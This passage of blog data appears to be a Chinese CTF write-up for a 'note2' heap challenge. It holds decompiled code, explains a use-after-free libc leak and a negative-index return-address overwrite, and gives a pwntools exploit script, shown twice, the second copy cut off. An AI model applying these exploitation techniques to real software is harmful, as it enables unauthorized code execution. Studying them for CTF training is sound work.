result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>有个小UAF，释放了一个chunk之后，重新malloc的时候虽然会重新写一些内容，但原有的内容不会清空（如果没有覆盖的话）。</p>\n<p>可以先将chunk放入unsorted bin，再次malloc的时候只写入8byte，这样bk处仍保存有unsorted bin头的地址，借此可以泄露libc。</p>\n<p>除此之外，modify中存在<strong>下标负溢出</strong>，并且由于堆块指针存储在栈上，因此可以利用下标负溢出改写返回地址，调整寄存器的值后执行one_gadget</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./note2&quot;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc-2.31.so&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=process(&quot;./note2&quot;)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;39.106.78.22&#x27;</span>,<span class=\"number\">35569</span>)</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">build</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;5. leave\\n&quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Size: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Content: &quot;</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">display</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;5. leave\\n&quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Index: &quot;</span>)</span><br><span class=\"line\"> \tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Content: &quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">modify</span>(<span class=\"params\">idx,content</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;5. leave\\n&quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Index: &quot;</span>)</span><br><span class=\"line\"> \tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"> \tp.recvuntil(<span class=\"string\">&quot;Content: &quot;</span>)</span><br><span class=\"line\"> \tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\"> \tp.recvuntil(<span class=\"string\">&quot;5. leave\\n&quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Index: &quot;</span>)</span><br><span class=\"line\"> \tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"> \tp.recvuntil(<span class=\"string\">&quot;done&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>():</span><br><span class=\"line\"> \tgdb.attach(p,<span class=\"string\">&#x27;b* 0x401714&#x27;</span>)</span><br><span class=\"line\"> \tpause()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">build(<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>)<span class=\"comment\">#idx0</span></span><br><span class=\"line\">build(<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;c&#x27;</span>*<span class=\"number\">0x20</span>)<span class=\"comment\">#idx1</span></span><br><span class=\"line\">build(<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>)<span class=\"comment\">#idx2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):<span class=\"comment\">#3,4,5,6,7,8,9</span></span><br><span class=\"line\">\tbuild(<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;b&#x27;</span>*<span class=\"number\">0x20</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">\tdelete(<span class=\"number\">3</span>+i)</span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):<span class=\"comment\">#1,3,4,5,6,7,8</span></span><br><span class=\"line\">\tbuild(<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">build(<span class=\"number\">0x30</span>,<span class=\"string\">&#x27;f&#x27;</span>*<span class=\"number\">0x8</span>)<span class=\"comment\">#9</span></span><br><span class=\"line\"></span><br><span class=\"line\">display(<span class=\"number\">9</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">leak=u64(p.recvline()[<span class=\"number\">8</span>:<span class=\"number\">14</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">unsort=leak-<span class=\"number\">0x80</span></span><br><span class=\"line\">mhook=unsort-<span class=\"number\">96</span>-<span class=\"number\">0x10</span></span><br><span class=\"line\">libcbase=mhook-libc.symbols[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">one_gadget = [<span class=\"number\">0xe3afe</span>,<span class=\"number\">0xe3b01</span>,<span class=\"number\">0xe3b04</span>]</span><br><span class=\"line\">free_hook=libcbase+libc.symbols[<span class=\"string\">&#x27;__free_hook&#x27;</span>]</span><br><span class=\"line\">log.info(<span class=\"string\">&quot;unsorted bin: &quot;</span>+<span class=\"built_in\">hex</span>(unsort))</span><br><span class=\"line\">log.info(<span class=\"string\">&quot;libcbase : &quot;</span>+<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">log.info(<span class=\"string\">&quot;malloc hook : &quot;</span>+<span class=\"built_in\">hex</span>(mhook))</span><br><span class=\"line\">log.info(<span class=\"string\">&quot;free hook : &quot;</span>+<span class=\"built_in\">hex</span>(free_hook))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#debug()</span></span><br><span class=\"line\"><span class=\"comment\">#pop 0x00000000004017ac</span></span><br><span class=\"line\">pop_addr= <span class=\"number\">0x00000000004017ac</span></span><br><span class=\"line\"><span class=\"comment\">#modify(-6,p64(0)+p64(libcbase+one_gadget[0]))</span></span><br><span class=\"line\"><span class=\"comment\">#pop r12 r15 to satisfy one_gadget</span></span><br><span class=\"line\">modify(-<span class=\"number\">6</span>,p64(<span class=\"number\">0</span>)+p64(pop_addr)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(libcbase+one_gadget[<span class=\"number\">0</span>]))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<p>美团的题，看起来是堆题，但实际上用的是栈溢出，主要漏洞是数组下标越界。</p>","more":"<p>64位菜单，只开了NX</p>\n<p>有build、delete、modify、display四个功能</p>\n<p>build</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">build</span><span class=\"params\">(__int64 a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> result; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> size; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  _BYTE idx[<span class=\"number\">12</span>]; <span class=\"comment\">// [rsp+14h] [rbp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  *(_QWORD *)idx = (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)get_idx(a1);   <span class=\"comment\">// 最多同时build16个,0~15</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *(_DWORD *)idx == <span class=\"number\">-1</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;No free space already&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Size: &quot;</span>);</span><br><span class=\"line\">  size = get_input();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !size || size &gt; <span class=\"number\">0x1FF</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Not allowed&quot;</span>);</span><br><span class=\"line\">  *(_QWORD *)&amp;idx[<span class=\"number\">4</span>] = <span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Content: &quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, *(<span class=\"type\">void</span> **)&amp;idx[<span class=\"number\">4</span>], size);</span><br><span class=\"line\">  *(_QWORD *)(a1 + <span class=\"number\">16LL</span> * *(<span class=\"type\">int</span> *)idx) = *(_QWORD *)&amp;idx[<span class=\"number\">4</span>];</span><br><span class=\"line\">  result = size;</span><br><span class=\"line\">  *(_DWORD *)(a1 + <span class=\"number\">16LL</span> * *(<span class=\"type\">int</span> *)idx + <span class=\"number\">8</span>) = size;<span class=\"comment\">// 有个地方存着size</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>delete</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">sub_4013F3</span><span class=\"params\">(__int64 a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> idx; <span class=\"comment\">// [rsp+1Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index: &quot;</span>);</span><br><span class=\"line\">  idx = get_input();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( idx &gt; <span class=\"number\">0x10</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Not allowed&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !*(_QWORD *)(<span class=\"number\">16LL</span> * idx + a1) )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Nothing here&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">free</span>(*(<span class=\"type\">void</span> **)(<span class=\"number\">16LL</span> * idx + a1));</span><br><span class=\"line\">  *(_QWORD *)(<span class=\"number\">16LL</span> * idx + a1) = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  *(_DWORD *)(<span class=\"number\">16LL</span> * idx + a1 + <span class=\"number\">8</span>) = <span class=\"number\">0</span>;         <span class=\"comment\">// 有个小UAF</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;done&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>modify</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">sub_4014B6</span><span class=\"params\">(__int64 a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> idx; <span class=\"comment\">// [rsp+14h] [rbp-Ch]</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *buf; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index: &quot;</span>);</span><br><span class=\"line\">  idx = get_input();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( idx &gt; <span class=\"number\">16</span> || !*(_QWORD *)(<span class=\"number\">16LL</span> * idx + a1) )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Not allowed&quot;</span>);</span><br><span class=\"line\">  buf = *(<span class=\"type\">void</span> **)(<span class=\"number\">16LL</span> * idx + a1);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Content: &quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> read(<span class=\"number\">0</span>, buf, *(<span class=\"type\">int</span> *)(<span class=\"number\">16LL</span> * idx + a1 + <span class=\"number\">8</span>));<span class=\"comment\">// 只能写size大小，但index可以为负数</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>display</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">sub_401580</span><span class=\"params\">(__int64 a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> result; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> idx; <span class=\"comment\">// [rsp+14h] [rbp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index: &quot;</span>);</span><br><span class=\"line\">  idx = get_input();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( idx &lt;= <span class=\"number\">0x10</span> &amp;&amp; *(_QWORD *)(<span class=\"number\">16LL</span> * idx + a1) )</span><br><span class=\"line\">    result = <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Content: %s\\n&quot;</span>, *(<span class=\"type\">const</span> <span class=\"type\">char</span> **)(<span class=\"number\">16LL</span> * idx + a1));</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    result = <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Not allowed&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>有个小UAF，释放了一个chunk之后，重新malloc的时候虽然会重新写一些内容，但原有的内容不会清空（如果没有覆盖的话）。</p>\n<p>可以先将chunk放入unsorted bin，再次malloc的时候只写入8byte，这样bk处仍保存有unsorted bin头的地址，借此可以泄露libc。</p>\n<p>除此之外，modify中存在<strong>下标负溢出</strong>，并且由于堆块指针存储在栈上，因此可以利用下标负溢出改写返回地址，调整寄存器的值后执行one_gadget</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./note2&quot;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc-2.31.so&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=process(&quot;./note2&quot;)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;39.106.78.22&#x27;</span>,<span class=\"number\">35569</span>)</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">build</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;5. leave\\n&quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Size: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Content: &quot;</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">display</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;5. leave\\n&quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Index: &quot;</span>)</span><br><span class=\"line\"> \tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Content: &quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">modify</span>(<span class=\"params\">idx,content</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;5. leave\\n&quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Index: &quot;</span>)</span><br><span class=\"line\"> \tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"> \tp.recvuntil(<span class=\"string\">&quot;Content: &quot;</span>)</span><br><span class=\"line\"> \tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\"> \tp.recvuntil(<span class=\"string\">&quot;5. leave\\n&quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Index: &quot;</span>)</span><br><span class=\"line\"> \tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"> \tp.recvuntil(<span class=\"string\">&quot;done&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>():</span><br><span class=\"line\"> \tgdb.attach(p,<span class=\"string\">&#x27;b* 0x401714&#x27;</span>)</span><br><span class=\"line\"> \tpause()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">build(<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>)<span class=\"comment\">#idx0</span></span><br><span class=\"line\">build(<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;c&#x27;</span>*<span class=\"number\">0x20</span>)<span class=\"comment\">#idx1</span></span><br><span class=\"line\">build(<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>)<span class=\"comment\">#idx2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):<span class=\"comment\">#3,4,5,6,7,8,9</span></span><br><span class=\"line\">\tbuild(<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;b&#x27;</span>*<span class=\"number\">0x20</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">\tdelete(<span class=\"number\">3</span>+i)</span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):<span class=\"comment\">#1,3,4,5,6,7,8</span></span><br><span class=\"line\">\tbuild(<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">build(<span class=\"number\">0x30</span>,<span class=\"string\">&#x27;f&#x27;</span>*<span class=\"number\">0x8</span>)<span class=\"comment\">#9</span></span><br><span class=\"line\"></span><br><span class=\"line\">display(<span class=\"number\">9</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">leak=u64(p.recvline()[<span class=\"number\">8</span>:<span class=\"number\">14</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">unsort=leak-<span class=\"number\">0x80</span></span><br><span class=\"line\">mhook=unsort-<span class=\"number\">96</span>-<span class=\"number\">0x10</span></span><br><span class=\"line\">libcbase=mhook-libc.symbols[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">one_gadget = [<span class=\"number\">0xe3afe</span>,<span class=\"number\">0xe3b01</span>,<span class=\"number\">0xe3b04</span>]</span><br><span class=\"line\">free_hook=libcbase+libc.symbols[<span class=\"string\">&#x27;__free_hook&#x27;</span>]</span><br><span class=\"line\">log.info(<span class=\"string\">&quot;unsorted bin: &quot;</span>+<span class=\"built_in\">hex</span>(unsort))</span><br><span class=\"line\">log.info(<span class=\"string\">&quot;libcbase : &quot;</span>+<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">log.info(<span class=\"string\">&quot;malloc hook : &quot;</span>+<span class=\"built_in\">hex</span>(mhook))</span><br><span class=\"line\">log.info(<span class=\"string\">&quot;free hook : &quot;</span>+<span class=\"built_in\">hex</span>(free_hook))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#debug()</span></span><br><span class=\"line\"><span class=\"comment\">#pop 0x00000000004017ac</span></span><br><span class=\"line\">pop_addr= <span class=\"number\">0x00000000004017ac</span></span><br><span class=\"line\"><span class=\"comment\">#modify(-6,p64(0)+p64(libcbase+one_gadget[0]))</span></span><br><span class=\"line\"><span class=\"comment\">#pop r12 r15 to satisfy one_gadget</span></span><br><span class=\"line\">modify(-<span class=\"number\">6</span>,p64(<span class=\"number\">0</span>)+p64(pop_addr)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(<span 